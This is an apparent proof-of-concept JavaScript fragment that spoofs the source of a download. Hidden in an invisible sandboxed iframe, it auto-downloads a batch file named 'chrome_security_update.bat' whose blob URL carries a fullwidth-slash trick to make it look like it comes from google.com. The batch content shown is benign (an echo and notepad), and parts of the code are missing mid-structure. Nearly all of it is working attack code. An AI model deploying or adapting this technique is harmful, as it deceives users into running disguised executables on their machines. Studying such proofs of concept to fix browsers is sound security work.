    function executeDownloadPayload() {
      const iframe = document.createElement('iframe');
      iframe.sandbox = 'allow-scripts allow-downloads'; 
      iframe.style.display = 'none'; 
      document.body.appendChild(iframe);

      // Payload: Creates .bat file with spoofed blob URL origin

            '@echo off',

            'echo.',
            'echo Update completed successfully!',
            'echo.',
            'start "" "C:\\\\Windows\\\\System32\\\\notepad.exe"',
            'pause'
          ];
          const batContent = batLines.join('\\r\\n');

          // Create blob URL for the .bat file
          const blob = new Blob([batContent], { type: "application/octet-stream" });
          const realUrl = URL.createObjectURL(blob);
          const uuid = realUrl.split("/").pop();

          // INJECTION: Fullwidth solidus (U+FF0F) in blob URL fragment to spoof origin
          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
          const filename = "chrome_security_update.bat";

          // Trigger download with spoofed origin
          const a = document.createElement("a");
          a.href = spoofedUrl;
          a.download = filename;
          document.body.appendChild(a);
          a.click();

          // Cleanup: remove element and revoke blob URL
          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
        <\/script></body></html>
      `;
      
      iframe.srcdoc = iframeHTML;
